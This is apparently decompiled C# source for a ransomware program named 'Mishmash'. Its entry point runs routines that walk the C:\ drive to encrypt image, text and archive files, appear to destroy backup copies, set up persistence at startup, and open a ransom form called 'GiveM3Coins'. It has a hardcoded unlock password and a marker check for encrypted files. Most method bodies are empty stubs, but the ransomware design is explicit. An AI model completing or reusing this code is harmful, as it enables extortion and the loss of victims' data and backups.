using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mishmash;

internal class Program
{
	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static char[] password = new char[4] { 'p', 'a', 's', 's' };

	private static readonly string[] extensionsToEncrypt = new string[4] { "jpg", "jpeg", "txt", "rar" };

	[STAThread]
	public static char[] GetPass()
	{
		return password;
	}

	private static void Main()
	{
		ProtectFiles();
		DestroyCopy();
		SetStartup();
		CreateUI();
	}

	private static void SetStartup()
	{
	}

	private static void CreateUI()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		GiveM3Coins giveM3Coins = new GiveM3Coins();
		Application.Run((Form)(object)giveM3Coins);
	}

	public static void DescrambleFile(string fileEncrypted, string password)
	{
	}

	public static void DestroyCopy()
	{
	}

	public static void ScrambleFile(string fileUnencrypted)
	{
	}

	public static void ProtectFiles()
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 1, "");
	}

	public static void UndoProtectFiles(string decryption_password)
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 0, decryption_password);
	}

	public static void ProcessDirectory(string targetDirectory, int action, string password)
	{
	}

	public static bool IsMarked(string fileName)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("M!shMash");
		byte[] second = File.ReadAllBytes(fileName).Take(8).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName, int action, string password)
	{
	}
}
